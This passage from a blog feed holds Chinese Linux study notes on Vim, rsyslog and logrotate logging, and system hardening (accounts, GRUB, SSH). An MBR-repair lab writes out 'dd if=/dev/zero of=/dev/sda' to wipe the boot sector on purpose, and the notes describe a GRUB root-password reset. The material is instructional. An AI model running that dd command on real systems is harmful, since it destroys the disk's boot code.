]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-文本编辑器Vim</title>
    <url>/2017/12/25/etc/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8Vim/</url>
    <content><![CDATA[<h1 id="文本编辑器Vim"><a href="#文本编辑器Vim" class="headerlink" title="文本编辑器Vim"></a>文本编辑器Vim</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>没有菜单，只有命令</li>
<li>三种工作模式<ul>
<li>命令模式<ul>
<li>打开文件后的默认模式</li>
<li>输入会被当作命令而非字符</li>
<li>wq退出<a id="more"></a></li>
</ul>
</li>
<li>插入模式<ul>
<li>命令模式下a、i、o进入</li>
<li>ESC退出至命令模式</li>
</ul>
</li>
<li>编辑模式<ul>
<li>命令模式下冒号进入</li>
<li>输入命令，如设置行号set nu</li>
<li>命令以回车结束运行</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><ul>
<li>插入命令（命令模式进入插入模式<ul>
<li>a：在光标所在字符后插入</li>
<li>A：光标所在行尾</li>
<li>i：光标所在字符前</li>
<li>I：光标所在行首</li>
<li>o：光标下插入新行</li>
<li>O：光标上插入新行</li>
</ul>
</li>
<li>定位命令（命令和编辑模式下<ul>
<li>：set nu—设置行号</li>
<li>：set nonu—取消行号</li>
<li>gg—到第一行</li>
<li>G—到最后一行</li>
<li>nG—到第n行</li>
<li>：n—到第n行</li>
<li>$—移至行尾</li>
<li>0—移至行首</li>
</ul>
</li>
<li>删除命令<ul>
<li>x：删除光标所在处字符</li>
<li>nx：删除光标所在处后n个字符</li>
<li>dd：删除光标所在行，ndd删除n行</li>
<li>dG：删除光标所在行到文件末尾内容</li>
<li>D：删除光标所在处到行尾内容</li>
<li>：m，nd—删除m行到n行</li>
</ul>
</li>
<li>复制、剪切、粘贴<ul>
<li>yy：复制当前行</li>
<li>nyy：复制当前行以下n行</li>
<li>dd：剪切当前行</li>
<li>ndd：剪切当前行以下n行</li>
<li>p、P：粘贴在所在行的行下或行上</li>
</ul>
</li>
<li>替换或取消命令<ul>
<li>r：取代光标所在处字符</li>
<li>R：从光标所在处开始替换字符，ESC结束</li>
<li>u：取消上一步操作，即撤销</li>
</ul>
</li>
<li>搜索或搜索替换<ul>
<li>/+string：搜索指定string<ul>
<li>：set ic—搜索命令前执行，忽略大小写（noic取消</li>
<li>n：下一个</li>
</ul>
</li>
<li>：%s/old/new/g——全文替换指定字符串（%s表示全文替换</li>
<li>：m,ns/old/new/g——在一定范围内替换指定字符串<ul>
<li>起始行，终止行 s/要替换的字符串/新的字符串/g或者c</li>
<li>g不询问，c询问以确认是否替换</li>
</ul>
</li>
</ul>
</li>
<li>保存和退出命令<ul>
<li>：w——保存修改</li>
<li>：w newfilename——另存为新文件（可使用文件路径，如/etc/backup.txt</li>
<li>：wq——保存修改并退出</li>
<li>ZZ：快捷键，保存修改并退出</li>
<li>：q！——不保存修改退出</li>
<li>：wq！——保存修改并退出<ul>
<li>文件所有者及root可使用</li>
<li>强行保存，如root打开一个只读文件，使修改生效时</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><ul>
<li>文件中导入其它<ul>
<li>r +文件名：将指定文件的内容导入到此文件中</li>
<li>！+ 命令：不退出vim，执行系统命令</li>
<li>r + ！+ 命令：不退出vim，执行命令并将其结果导入此文件中</li>
</ul>
</li>
<li>定义快捷键<ul>
<li>：map+快捷键+触发的命令</li>
<li>举例<ul>
<li>添加行注释<ul>
<li>：map  ^P  I#<esc></esc></li>
<li>Ctrl+v+p会生成ctrl+p的命令，即^P</li>
<li>I：跳到行首并进入插入模式</li>
<li>#：添加注释符</li>
<li><esc>：退出插入模式至命令模式</esc></li>
<li>ctrl+p即可注释当前行</li>
</ul>
</li>
<li>取消当前行注释<ul>
<li>：map ^B 0x</li>
<li>Ctrl+v+p会生成ctrl+p的命令，即^P</li>
<li>0:  跳到行首（不进入插入模式，同I不同</li>
<li>x：删除光标处第一个字符（#一般是每行的第一个字符</li>
<li>ctrl+b会取消行注释</li>
</ul>
</li>
<li>插入邮箱等常用信息<ul>
<li>：map ^H   i+邮箱等+<esc></esc></li>
<li>I：当前光标处进入插入模式</li>
<li>添加自定义常用信息</li>
<li>esc：退出至命令模式</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>连续行注释<ul>
<li>应用到vim替换命令的格式（：m,ns/old/new/g</li>
<li>添加多行注释<ul>
<li>：m,ns/^/#/g</li>
<li>m-n行</li>
<li>^：表示行首这个特殊字符</li>
<li>#：替换为注释符#（也可以为其它，如//，但需要转义\/\/</li>
</ul>
</li>
<li>取消多行注释<ul>
<li>：m,ns/^#//g</li>
<li>^#：将行首的#替换为空，即去掉</li>
<li>一定加^，否则不是行首的#也会被删</li>
</ul>
</li>
</ul>
</li>
<li>替换<ul>
<li>：ab mymail <a href="mailto:123123123@163.com" target="_blank" rel="noopener">123123123@163.com</a></li>
<li>ab：替换命令，本意是输入a时，回车或空格后变为b</li>
<li>如输入mymail，空格或回车后变为我的自定义邮箱</li>
<li>编辑模式下定义替换的信息</li>
<li>插入模式下使用</li>
</ul>
</li>
<li>配置文件问题<ul>
<li>上述操作仅本次vim使用时有效</li>
<li>若要永久生效，需保存到vim的配置文件<ul>
<li>root用户：/root/.vimrc</li>
<li>其它：/home/用户名/.vimrc</li>
</ul>
</li>
<li>针对编辑模式下的命令，即冒号开头的</li>
<li>保存到配置文件时，不需要带冒号</li>
<li>一条命令占一行</li>
<li>如永久显示行号，文件内容为“set nu”（不带冒号，且占一行</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-日志管理</title>
    <url>/2017/12/25/etc/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h1><h2 id="日志管理简介"><a href="#日志管理简介" class="headerlink" title="日志管理简介"></a>日志管理简介</h2><ul>
<li>平常无关紧要，系统出错时必看</li>
<li>日志服务<ul>
<li>rsyslog取代syslog，两者兼容，前者较后者先进</li>
</ul>
</li>
<li>确定服务已启动<a id="more"></a><ul>
<li>ps -aux | grep rsyslogd：查看其是否启动</li>
<li>chkconfig —list | grep rsyslog：查看其是否自启动</li>
</ul>
</li>
<li>常见系统日志<ul>
<li>/var/log/cron<ul>
<li>记录系统定时任务相关的日志</li>
</ul>
</li>
<li>/var/log/cups<ul>
<li>记录打印信息的日志</li>
</ul>
</li>
<li>/var/log/dmesg<ul>
<li>记录系统开机时内核的自检信息</li>
<li>可使用dmesg命令直接查看内核自检信息</li>
</ul>
</li>
<li>/var/log/btmp<ul>
<li>记录错误登录的日志</li>
<li>此文件为二进制文件，不可vi查看</li>
<li>使用lastb命令查看（无需参数</li>
</ul>
</li>
<li>/var/log/lastlog<ul>
<li>记录系统中所有用户最后一次登录时间</li>
<li>也为二进制文件，不可用vi查看</li>
<li>使用lastlog命令（无需参数</li>
</ul>
</li>
<li>/var/log/maillog<ul>
<li>记录邮件信息</li>
</ul>
</li>
<li>/var/log/message<ul>
<li>记录系统重要信息的日志</li>
<li>系统出问题时，优先检查此文件</li>
</ul>
</li>
<li>/var/log/secure<ul>
<li>记录验证和授权方面的信息</li>
<li>只要涉及账号和密码的程序都会记录</li>
<li>如系统登录、ssh的登录、su切换用户、sudo授权、甚至添加用户和修改密码都会记录</li>
</ul>
</li>
<li>/var/log/wtmp<ul>
<li>永久记录所有用户的登录、注销信息</li>
<li>同时记录系统的启动、重启、关机事件</li>
<li>二进制文件，不可次面，需last命令</li>
</ul>
</li>
<li>/var/log/utmp<ul>
<li>记录当前已登录的用户信息</li>
<li>会随着用户的登录和注销而动态变化，只记录当前登录用户</li>
<li>不可直接vi，需w、who、user命令查看</li>
</ul>
</li>
</ul>
</li>
<li>常用日志查看命令<ul>
<li>vi直接查看</li>
<li>last</li>
<li>lastlog</li>
<li>lasttab</li>
<li>w、who、user等</li>
</ul>
</li>
<li>其它日志<ul>
<li>简介<ul>
<li>除了系统默认日志，还存在RPM安装的服务，也保存在/var/log下</li>
<li>这些日志不是由rsyslog记录和管理，但是格式是兼容的</li>
<li>各个服务使用自己的日志管理文档来记录自身日志</li>
</ul>
</li>
<li>/var/log/httpd<ul>
<li>Apache服务的日志</li>
</ul>
</li>
<li>/var/log/mail<ul>
<li>RPM安装的邮件服务的额外日志记录</li>
</ul>
</li>
<li>/var/log/samba<ul>
<li>rpm安装的samba的日志</li>
</ul>
</li>
<li>/var/log/sssd<ul>
<li>守护进程安全服务目录</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rsyslogd日志服务"><a href="#rsyslogd日志服务" class="headerlink" title="rsyslogd日志服务"></a>rsyslogd日志服务</h2><ul>
<li>基本日志格式<ul>
<li>事件产生时间</li>
<li>发生事件的服务器的主机名</li>
<li>发生事件的服务名或程序名</li>
<li>事件的具体信息</li>
</ul>
</li>
<li>/etc/rsyslog.conf配置文件<ul>
<li>如一条记录为：authpriv.*           /var/log/secure</li>
<li>服务名称+连接符号+所有日志等级：日志记录位置<ul>
<li>相关服务有<ul>
<li>auth：安全和认证相关</li>
<li>authpriv：安全和认证相关（私有</li>
<li>cron：系统定时任务cront和at产生的日志</li>
<li>daemon：和各个守护进程相关的日志</li>
<li>ftp：ftp守护进程产生的日志</li>
<li>kern：内核产生的日志（不是用户进程产生的</li>
<li>local0-local7:为本地使用预留的服务</li>
<li>lpr：打印产生的日志</li>
</ul>
</li>
<li>连接符号<ul>
<li>*代表所有日志等级</li>
<li>.代表只要比后面的等级高的（包含该等级）日志都记录下来</li>
<li>.=代表只记录所需等级的日志，其他的都不记录</li>
<li>.！代表不等于，即除了该等级的日志外，其它等级的日志都记录</li>
</ul>
</li>
<li>日志等级<ul>
<li>等级越高，记录的信息越少，越低，记录的越多</li>
<li>debug，info，notice，warning，err，crit，alert，emerge</li>
</ul>
</li>
<li>日志记录位置<ul>
<li>日志文件的绝对路径</li>
<li>系统设备文件</li>
<li>转发给远程主机，如@xx.xx.xx.xx：614</li>
<li>用户名，如root</li>
<li>忽略或丢弃日志，如～</li>
</ul>
</li>
</ul>
</li>
<li>认证相关服务.所有日志等级，都记录在/var/log/secure日志中</li>
</ul>
</li>
</ul>
<h2 id="日志轮替"><a href="#日志轮替" class="headerlink" title="日志轮替"></a>日志轮替</h2><ul>
<li>日志文件命名规则<ul>
<li>若配置文件中有dateext参数，那么日志会用日期来作为日志文件的后缀；这样日志文件名不会重复，也不需要日志文件改名，只需要保存指定的日志个数，删除多余的日志即可</li>
<li>若配置文件没有dateext参数，那么日志文件就需要改名；第一次日志轮替时，当前的Secure会自动改名为Secure.1，然后新建Secure日志用来保存新的日志；第二次日志轮替时，secure.1会自动改为secure.2，当前的secure会自动改名为secure.11，然后也会新建secure保存新日志；以此类推</li>
</ul>
</li>
<li><p>logrotate配置文件</p>
<ul>
<li>位置：/etc/logrotate.conf</li>
<li>参数相关<ul>
<li>daily/weekly/monthly：日志的轮替周期是每日/每星期/每月</li>
<li>rotate + 数字：保留的日志文件的个数，0指没有备份</li>
<li>compress：日志轮替时，旧的日志进行压缩</li>
<li>create mode owner group：建立新日志，同时指定新日志的权限与所有者与所属组</li>
<li>mail address：当日志轮替时，输出内容通过邮件发送到指定的邮件地址</li>
<li>missingok：若日志不存在，忽略该日志的警告信息</li>
<li>notifempty：若日志为空文件，则不进行日志轮替</li>
<li>minsize大小：日志轮替的最小值，即日志一定要达到这个最小值才会轮替，否则就算时间达到也不轮替</li>
<li>size + 大小：日志只有大于指定大小才进行日志轮替，而不是按照时间轮替</li>
<li>dateext：使用日期作为日志轮替文件的后缀</li>
</ul>
</li>
<li><p>如，apache日志加入轮替</p>
<ul>
<li>注意<ul>
<li>rpm包安装的软件默认都会自动加入日志轮替</li>
<li>这里手工添加的，多针对源码包安装的</li>
<li>如源码包安装的apache，其日志量非常大，但没有自动加入轮替，所以在这手动添加</li>
<li>加入后，便会自动进行日志轮替，类似于系统定时任务</li>
</ul>
</li>
<li><p>大体步骤</p>
<ul>
<li>vim /etc/logrotate.conf</li>
<li><p>编辑此文件，新加入以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/apache2/logs/access_log｛</span><br><span class="line">daily</span><br><span class="line">create</span><br><span class="line">rotate 30</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>
<ul>
<li>绝对路径的形式写上需要轮替的日志文件</li>
<li>daily为每天备份</li>
<li>create表示备份时创建新的</li>
<li>rotate 30意味着保留30个日志文件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>logrotate命令<ul>
<li>简介<ul>
<li>有时写入到配置文件的日志轮替还没有进行轮替，是因为其可能没到时间，logrotate相关命令可以强制其进行日志轮替，不需要其满足轮替时的时间要求</li>
<li>转自动为手动的思想</li>
</ul>
</li>
<li>常见使用<ul>
<li>logrotate +选项+配置文件名</li>
<li>如果此命令没有选项，则会按照配置文件中的条件进行日志轮替</li>
<li>-v：显示日志轮替过程，加了v选项，会显示日志轮替多的过程，如待轮替的日志有哪些，这些日志有没有经过了轮替</li>
<li>-f：强制进行日志轮替，不管日志轮替的条件是否已经符合条件，强制配置文件中所有的日志进行轮替</li>
<li>如logrotate -v /etc/logrotate.conf</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-系统安全应用</title>
    <url>/2017/12/25/etc/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Linux系统安全应用"><a href="#Linux系统安全应用" class="headerlink" title="Linux系统安全应用"></a>Linux系统安全应用</h1><h2 id="Linux基本安全"><a href="#Linux基本安全" class="headerlink" title="Linux基本安全"></a>Linux基本安全</h2><ul>
<li>CentOS7的安装<ul>
<li>Box虚拟机安装</li>
<li>安装增强功能</li>
<li>其他</li>
</ul>
</li>
<li>配置本地YUM源<a id="more"></a><ul>
<li>目的<ul>
<li>确保以后在使用过程中进行快速有效的软件安装，在线下载慢</li>
</ul>
</li>
<li>什么是yum<ul>
<li>基于RPM的软件更新机制</li>
<li>自动解决操蛋的依赖关系</li>
<li>软件包由统一的yum软件仓库提供</li>
</ul>
</li>
<li>软件仓库的提供方式<ul>
<li>FTP服务，ftp协议</li>
<li>HTTP服务，http协议</li>
<li>本地目录，file协议</li>
</ul>
</li>
<li>RPM软件包的来源<ul>
<li>Red Hat发布的RPM包集合</li>
<li>第三方组织，如EPEL源</li>
<li>用户自定义发布的</li>
</ul>
</li>
<li>简单步骤<ul>
<li>前期准备，针对服务端<ul>
<li>1，配置网卡静态IP地址</li>
<li>2，配置主机名</li>
<li>3，配置主机记录，hosts文件。<br>建立静态IP与主机名的关联。</li>
</ul>
</li>
<li>思路<ul>
<li>A主机作为服务端，含有软件仓库<ul>
<li>挂载光盘，由光盘拷贝至本地，也就是源在本地目录</li>
<li>通过本地源安装ftp服务，并配置，将光盘目录拷贝到ftp站点。启动服务。</li>
<li>配置vsFTPd安全<ul>
<li>防火墙允许ftp服务</li>
<li>添加允许的tcp端口</li>
</ul>
</li>
</ul>
</li>
<li>B主机作为客户端，测试yum源是否可用<ul>
<li>修改yum源配置文件，ftp方式访问服务端yum源</li>
<li>Yum安装软件测试，服务端构建的本地yum是否可用</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>利用PXE远程装机服务批量部署Linux<ul>
<li>目的<ul>
<li>批量安装linux系统。</li>
<li>统一，高效，标准，安全</li>
</ul>
</li>
<li>简要步骤<ul>
<li>安装并配置dhcp服务<ul>
<li>Yum安装</li>
<li>编辑配置文件，指定PXE引导服务器，指定引导文件（模块）</li>
<li>启动服务</li>
</ul>
</li>
<li>安装tftp-server和syslinux<ul>
<li>前者是引导模块的远程启动服务，后者是引导模块</li>
<li>都使用yum安装</li>
<li>Tftp不是独立运行的，需要借助xinetd服务，修改xinetd配置文件来启动tftp，配置文件中可以见到tftp的工作目录，记为1目录。启动xinet从而启动tftp。</li>
<li>将引导文件拷贝至其工作目录，在syslinux中</li>
<li>Centos7的安装光盘已经拷贝到本地，作为yum仓库，从其中拷贝相应文件到此目录</li>
<li>同上，yum源中获取启动菜单配置文件，并编辑</li>
<li>总之，tftp工作目录中放置许多系统启动的相关文件</li>
</ul>
</li>
<li>安装kickstart，并配置自动化安装<ul>
<li>是一个自动化安装工具，功能类似系统安装时图形界面，相当于批量化的所有主机的系统配置，如语言，网络配置，密码等</li>
<li>Yum安装后，启动，从而打开配置的窗口<ul>
<li>配置时，软件包选择处有bug，之后解决</li>
<li>配置完成，保存为ks.cfg文件</li>
<li>从其他配置文件 anaconda-ks.cfg拷贝软件信息，复制到ks.cfg内容中，弥补之前bug</li>
<li>Ks.cfg复制到ftp工作目录下</li>
</ul>
</li>
</ul>
</li>
<li>配置防火墙<ul>
<li>允许dhcp ，ftp服务</li>
<li>允许udp的69端口，也就是tftp</li>
</ul>
</li>
<li>同一网段，新建虚拟机，利用pxe进行远程安装，测试是否成功<ul>
<li>安装界面，新增通过pxe安装选项</li>
<li>实现自动化安装，避免各种配置</li>
<li>Kickstart中实现了配置</li>
</ul>
</li>
</ul>
</li>
<li>思路<ul>
<li>Syslinux，kickstart及centos7安装光盘中提供系统安装的必要文件及配置文件</li>
<li>Tftp充当文件服务器，其工作目录存放各种文件</li>
<li>dhcp指定pxe引导服务器和引导文件<ul>
<li>引导服务器为tftp等服务所在的主机</li>
<li>引导文件位于tftp工作目录</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>系统更新安全<ul>
<li>安装EPEL源<ul>
<li>系统安装后，默认的软件包</li>
<li>EPEL，扩展的软件包</li>
<li>有兼容性，不会与其他产生冲突</li>
<li>Yum安装epel源</li>
<li>安装后，可下载许多第三方软件，系统默认不提供的</li>
</ul>
</li>
<li>使用yum update更新系统时不升级内核<ul>
<li>系统与硬件存在兼容，内核升级后可能导致服务器不能正常启动。</li>
<li>故不要随意升级内核</li>
<li>更改yum配置文件，设置更新时不更新内核</li>
</ul>
</li>
<li>关闭自动下载更新<ul>
<li>业务系统稳定时，更新后可能会对其造成影响</li>
<li>更新前先对补丁包进行测试，确保不会对已有业务系统造成影响</li>
<li>故要设置为手动更新<ul>
<li>Cronie，yum-cron要启动，没有则先安装</li>
<li>修改yum-cron.conf文件，即改为手动</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>账号的基本安全<ul>
<li>注释掉系统不需要的用户和用户组<ul>
<li>注意<ul>
<li>最小的权限+最少的服务=最大的安全</li>
<li>不建议直接删除，#注释</li>
<li>修改文件：要修改，先备份</li>
</ul>
</li>
<li>相关文件<ul>
<li>etc/passwd用户账号配置文件<ul>
<li>记录的格式，以及字段的意义</li>
<li>记录中字段的分割符为冒号</li>
</ul>
</li>
<li>etc/group用户组账号配置文件</li>
</ul>
</li>
</ul>
</li>
<li>将非登录用户的shell设为sbin/nologin<ul>
<li>登录用户如常见的root用户</li>
<li>非登录用户如程序用户，用来运行程序或执行调用，如mysql用户</li>
<li>Usermod命令，s参数指定shell</li>
</ul>
</li>
<li>锁定一段时间内不使用的账号<ul>
<li>某员工离职，最好锁定，使其不可登录。<br>不可删除，有的数据可能与其有关</li>
<li>Usermod命令，L参数锁定</li>
<li>shadow文件中其记录的密码字段前多了！，便无法登录</li>
</ul>
</li>
<li>给账号，组账号，账号口令，组账号口令文件设置不可更改属性，即加锁<ul>
<li>防止非授权用户获得权限</li>
<li>chattr +i加锁，-i解锁；lsattr查看是否加锁</li>
<li>passwd，shadow，group，gshadow为用户账号，用户密码，组账号，组账号口令</li>
<li>加锁后，不允许添加删除用户；解锁后可尽行增删改操作，操作完再加锁</li>
<li>有四个文件需要加锁，四条命令，可编写脚本，一次运行</li>
</ul>
</li>
<li>账号口令的安全设置<ul>
<li>常见安全设置<ul>
<li>密码有效期</li>
<li>密码最小长度限制</li>
<li>强制用户下次登录修改密码，chage -d修改有效期为0</li>
</ul>
</li>
<li>两种方式<ul>
<li>针对新建用户，/etc/login.defs</li>
<li>针对已有用户，chage命令</li>
</ul>
</li>
</ul>
</li>
<li>命令历史限制<ul>
<li>减少记录的命令条数<ul>
<li>etc/profile，HISTSIZE字段，默认1000</li>
</ul>
</li>
<li>注销时自动清空历史命令记录<ul>
<li>修改～/.bash_logout文件，添加<br>history -c<br>clear</li>
</ul>
</li>
</ul>
</li>
<li>终端自动注销<ul>
<li>~/.bash_profile</li>
<li>添加export TIMEOUT =600</li>
</ul>
</li>
<li>Su命令切换用户<ul>
<li>切换用户，如su -root</li>
<li>Root向任意用户，不需要验证密码</li>
<li>普通用户向其他用户，验证目标用户密码</li>
</ul>
</li>
<li>限制使用su命令的用户<ul>
<li>启用pam_wheel认证模块<ul>
<li>/etc/pam.d/su</li>
<li>取消认证模块那一行的注释来启用</li>
</ul>
</li>
<li>将允许的用户加入wheel用户组<ul>
<li>gpasswd -a 用户 wheel</li>
</ul>
</li>
</ul>
</li>
<li>Sudo机制提升权限<ul>
<li>以目标用户身份执行授权的命令，如root</li>
<li>初次执行sudo，验证当前用户密码，不需要验证目标用户密码</li>
<li>配置文件，/etc/sudoers</li>
</ul>
</li>
</ul>
</li>
<li>引导与登录安全配置<ul>
<li>重置root密码<ul>
<li>Centos7与以前版本不同，忘记root密码，并采用GRUB2为启动器，无法通过单用户模式重置root密码</li>
<li>简单步骤<ul>
<li>1，启动系统，GRUB2启动显屏时，按下e进入编辑模式</li>
<li>2，在linux行的行尾添加“rd.break”，按“ctrl+x”进入</li>
<li>3，mount -o remount,rw /sysroot/ 命令，重新挂载系统分区</li>
<li>4，chroot /sysroot/命令，改变根</li>
<li>5，passwd root命令，根据提示输入密码和确认密码，更改密码</li>
<li>6，若系统启用了selinux，需touch /.autorelable，否则无法正常启动系统</li>
<li>7，ctrl + d ，退出</li>
<li>8，reboot重启</li>
</ul>
</li>
</ul>
</li>
<li>为GRUB2菜单加上防编辑密码<ul>
<li>防止恶意用户像上面一样更改root密码，欲进入编辑模式，需通过账号和密码验证才可。</li>
<li>大体步骤<ul>
<li>1，grub2-passwd-pbkdf2命令，输入待加密的密码，生成加密值</li>
<li>2，复制密文，“grub.”开始</li>
<li>3，编辑grub配置文件，“vim /boot/grub2/grub.cfg”</li>
<li>4，第一个menuentry前添加<ul>
<li>set superusers=”admin”</li>
<li>password_pbkdf2 admin 密文</li>
</ul>
</li>
<li>5，保存，退出，再次修改root密码来测试<ul>
<li>按e欲进入编辑模式，提示输入用户名密码来登录</li>
<li>输入错误不允许进入，无法进入编辑页面</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>修复MBR<ul>
<li>MBR为主引导记录<ul>
<li>硬盘的0柱面，0磁头，1扇区为主引导扇区</li>
<li>共512字节<ul>
<li>446Byte为bootloader，主引导记录主要指此</li>
<li>64为Partition table</li>
<li>2为magic number</li>
</ul>
</li>
</ul>
</li>
<li>大体步骤<ul>
<li>1，先进行备份，再破坏<ul>
<li>1，dd命令将sdr的MBR备份<ul>
<li>命令：<br>dd if=/dev/sda of=/root/mbr.bak count=1 bs=512</li>
<li>Linux是文件形式的系统，大部分数据以文件形式存在</li>
<li>Mbr是非文件形式，备份需要用dd，而非cp</li>
</ul>
</li>
<li>2，用zero设备生成446字节的0写入mbr来进行破坏<ul>
<li>命令：<br>dd if=/dev/zero of=/dev/sda count=1 bs=446</li>
<li>dev是设备的映射目录</li>
<li>zero是产生0的设备</li>
</ul>
</li>
<li>3，重启后发现系统已坏</li>
</ul>
</li>
<li>2，装入系统安装光盘，引导界面选择troubleshoot</li>
<li>3，选择救援模式，rescue a centos system</li>
<li>4，选择continue，以rw模式挂载分区</li>
<li>5，进入救援模式</li>
<li>6，grub2-install –root-directory=/mnt/sysimage /dev/sda 重建bootloader</li>
<li>7，sync写入系统</li>
<li>8，reboot重启系统，验证修复成功</li>
</ul>
</li>
</ul>
</li>
<li>修复GRUB<ul>
<li>GRUB配置文件<ul>
<li>其丢失后，开机后会直接进入grub页面，显示grub&gt;，致使系统正常启动失败</li>
<li>配置文件极其复杂，建议安装系统后进行备份</li>
</ul>
</li>
<li>大体步骤<ul>
<li>1，先备份后破坏<ul>
<li>复制boot下grub2目录下所有文件进行备份</li>
<li>删除grub.cfg配置文件来破坏</li>
</ul>
</li>
<li>2，重启系统，grub&gt;状态下输入一系列命令设置启动参数<ul>
<li>命令自行百度</li>
<li>Tab键会有提示</li>
<li>最后boot重启</li>
</ul>
</li>
<li>3，root登录，还原备份的配置文件</li>
<li>4，重启测试是否修复成功</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>远程访问安全SSH<ul>
<li>SSH简介<ul>
<li>安全shell，安全的远程连接</li>
<li>隧道技术，提供安全复制SCP，安全文件传输协议SFTP，X会话转发和端口转发</li>
<li>取代telnet，嗅探时抓到的全部是密文形式</li>
</ul>
</li>
<li>SSH的一般用途<ul>
<li>概括：远程登录主机并执行命令；支持隧道和X11连接；使用SFTP和SCP来传输文件</li>
<li>0，SCP，SFTP，rsync等命令都可以通过ssh隧道来实现特定功能</li>
<li>1，远程主机shell访问<ul>
<li>第一次连接需要下载并保存证书</li>
<li>登陆后可执行命令</li>
<li>取代telnet和rlogin等使用明文的不安全协议</li>
</ul>
</li>
<li>2，在远程主机执行单一命令，取代rsh</li>
<li>3，通过scp命令将文件在本地与远程主机之间复制，实现下载和上传功能</li>
<li>4，利用SFTP进行文件传输<ul>
<li>与scp不同，提供交互界面</li>
<li>比FTP安全</li>
</ul>
</li>
<li>5，结合rsync进行有效的备份</li>
<li>6，端口转发</li>
<li>7，从远程主机转发X会话</li>
<li>8，使用sshfs将远程主机的目录安全的挂载到本地</li>
</ul>
</li>
<li>SSH安全性和配置最佳实践<ul>
<li>1，限制root用户登录<ul>
<li>Root用户仅限制为控制台访问</li>
<li>进制通过ssh访问</li>
<li>修改配置文件的permitrootlogin处</li>
</ul>
</li>
<li>2，配置TCP wrapper，对远程主机进行访问控制<ul>
<li>有两个文件，etc下的hosts.deny和hosts.allow</li>
<li>针对进程的访问控制，如以上文件内容中，sshd: ALL</li>
<li>这两个文件的修改是即时生效的，不需要重启等操作</li>
</ul>
</li>
<li>3，个人笔记本电脑上，关闭ssh服务并卸载ssh服务器包<ul>
<li>针对个人笔记本或工作站等不需要远程登录的主机</li>
<li>关闭及卸载仅针对服务端，不影响客户端；不可被远程连接，可远程连接其他</li>
</ul>
</li>
<li>4，控制用户账号，限制其对ssh的访问<ul>
<li>etc下ssh下sshd_config 配置文件</li>
<li>通过添加Allowusers和Denyusers字段来控制</li>
</ul>
</li>
<li>5，仅使用ssh protocol 2<ul>
<li>版本1不太安全，不建议使用</li>
<li>sshd_config中Protocol 字段 值设置为2</li>
</ul>
</li>
<li>6，配置活动时间间隔，不支持闲置回话<ul>
<li>clientActive Interval 字段，超过一段时间不操作就退出</li>
<li>Client Active Count Max字段，设置为0为不支持闲置会话，但会有错误发生，默认为3即可</li>
</ul>
</li>
<li>7，禁用空密码，设置密码重试次数<ul>
<li>permitemptypasswords 字段为no</li>
<li>Maxauthtries字段设置次数</li>
</ul>
</li>
<li>8，禁用基于主机的身份验证， hostbaseauthentication</li>
<li>9，禁用用户的.rhosts文件<ul>
<li>ignorerhosts字段</li>
<li>rhosts文件是用户自己设置的控制用户登录的文件，启用会不安全</li>
</ul>
</li>
<li>10，限制ssh，将侦听绑定到指定的网络接口与端口<ul>
<li>很现实的问题，服务器有两块网卡，外网和内网，禁止外网IP用ssh</li>
<li>listenaddress字段</li>
<li>port字段</li>
</ul>
</li>
<li>11，始终保持ssh补丁版本更新<ul>
<li>openssh</li>
<li>openssh-client </li>
<li>Openssh-server</li>
</ul>
</li>
</ul>
</li>
<li>配置ssh身份认证<ul>
<li>登录验证对象<ul>
<li>服务器中的本地用户账号</li>
</ul>
</li>
<li>登录验证方式<ul>
<li>密码验证：用户名和密码是否匹配</li>
<li>秘钥对验证：客户私钥和服务器公钥是否匹配</li>
<li>配置文件中存在两种验证方式的关闭以及公钥库文件的存放位置</li>
</ul>
</li>
<li>构建秘钥对验证的ssh体系<ul>
<li>1，客户端创建秘钥对<ul>
<li>ssh-keygen -t rsa命令，指定类型为rsa</li>
<li>创建的秘钥对针对的是当前登录用户，如root</li>
<li>创建时可为私钥提供口令短语</li>
<li>私钥文件id_rsa，类似钥匙</li>
<li>公钥文件id_rsa.pub，类似锁</li>
</ul>
</li>
<li>2，上传公钥文件到服务器并将其内容写入公钥库文件<ul>
<li>公钥库文件由配置文件决定，默认.ssh目录下的authorized_keys，其内容存放公钥信息</li>
<li>ssh-copy-is admin@ip <ul>
<li>针对服务端的admin账号</li>
<li>操作时需要admin的登录密码</li>
</ul>
</li>
</ul>
</li>
<li>3，测试<ul>
<li>如果设置秘钥口令短语，在这需要验证</li>
<li>连接的是本地的root和远程的admin</li>
<li>本地root的锁（公钥）去锁定远程的admin账号，在用root的钥匙（私钥）去解</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>配置SFTP安全<ul>
<li>SFTP 账号直接使用系统账号，系统新建几个账号供sftp使用</li>
<li>为sftp账号建立相应账号</li>
<li>sftp通过ssh的配置文件而配置，sshd_config </li>
<li>目录权限设置<ul>
